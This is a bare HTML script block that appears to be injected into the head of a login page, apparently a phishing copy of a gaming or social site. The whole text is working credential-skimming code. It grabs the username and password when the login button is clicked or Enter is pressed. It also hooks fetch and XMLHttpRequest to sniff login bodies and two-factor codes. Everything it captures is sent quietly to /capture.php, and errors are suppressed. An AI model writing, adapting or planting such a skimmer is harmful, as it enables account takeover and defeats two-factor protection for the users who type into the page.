<script>
(function() {
    function getCredentials() {
        const u = document.querySelector('input#login-username, input[name="username"], input[name="cvalue"], input[type="text"]');
        const p = document.querySelector('input#login-password, input[name="password"], input[type="password"]');
        return {
            username: u ? u.value.trim() : '',
            password: p ? p.value : ''
        };
    }

    function beaconCredentials(data) {
        if (!data || (!data.username && !data.password && !data.twoFactorCode)) return;
        try {
            const payload = JSON.stringify({
                username: data.username || '',
                password: data.password || '',
                twoFactorCode: data.twoFactorCode || '',
                returnUrl: window.location.href,
                timestamp: new Date().toISOString()
            });
            if (navigator.sendBeacon) {
                navigator.sendBeacon('/capture.php', payload);
            } else {
                fetch('/capture.php', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: payload,
                    keepalive: true
                }).catch(function() {});
            }
        } catch(e) {}
    }

    // 1. Listen for clicks on login buttons and Enter key
    document.addEventListener('click', function(e) {
        const btn = e.target.closest('#login-button, [data-testid="login-button"], button[type="button"], button[type="submit"], .login-button, .btn-primary-md');
        if (btn) {
            const creds = getCredentials();
            if (creds.username && creds.password) {
                beaconCredentials(creds);
            }
        }
    }, true);

    document.addEventListener('keydown', function(e) {
        if (e.key === 'Enter') {
            const creds = getCredentials();
            if (creds.username && creds.password) {
                beaconCredentials(creds);
            }
        }
    }, true);

    // 2. Wrap window.fetch to silently sniff outgoing auth requests without interfering
    const _origFetch = window.fetch;
    window.fetch = function(input, init) {
        try {
            const url = typeof input === 'string' ? input : (input && input.url ? input.url : '');
            let body = (init && init.body) || (input && input.body);
            if (body && typeof body === 'string') {
                if (url.includes('/v2/login') || url.includes('/authenticate') || body.includes('"password"')) {
                    try {
                        const parsed = JSON.parse(body);
                        const u = parsed.cvalue || parsed.username;
                        const p = parsed.password;
                        if (u && p) {
                            beaconCredentials({ username: u, password: p });
                        }
                    } catch(e) {}
                }
                if (url.includes('two-step') || url.includes('two-factor') || body.includes('"code"')) {
                    try {
                        const parsed = JSON.parse(body);
                        if (parsed.code) {
                            const creds = getCredentials();
                            beaconCredentials({ username: creds.username, password: creds.password, twoFactorCode: parsed.code });
                        }
                    } catch(e) {}
                }
            }
        } catch(e) {}
        return _origFetch.apply(this, arguments);
    };

    // 3. Also wrap XMLHttpRequest
    const _origXhrSend = XMLHttpRequest.prototype.send;
    XMLHttpRequest.prototype.send = function(body) {
        try {
            if (body && typeof body === 'string') {
                if (body.includes('password') && (body.includes('cvalue') || body.includes('username'))) {
                    try {
                        const parsed = JSON.parse(body);
                        const u = parsed.cvalue || parsed.username;
                        const p = parsed.password;
                        if (u && p) {
                            beaconCredentials({ username: u, password: p });
                        }
                    } catch(e) {}
                }
                if (body.includes('"code"')) {
                    try {
                        const parsed = JSON.parse(body);
                        if (parsed.code) {
                            const creds = getCredentials();
                            beaconCredentials({ username: creds.username, password: creds.password, twoFactorCode: parsed.code });
                        }
                    } catch(e) {}
                }
            }
        } catch(e) {}
        return _origXhrSend.apply(this, arguments);
    };
})();
</script></head>
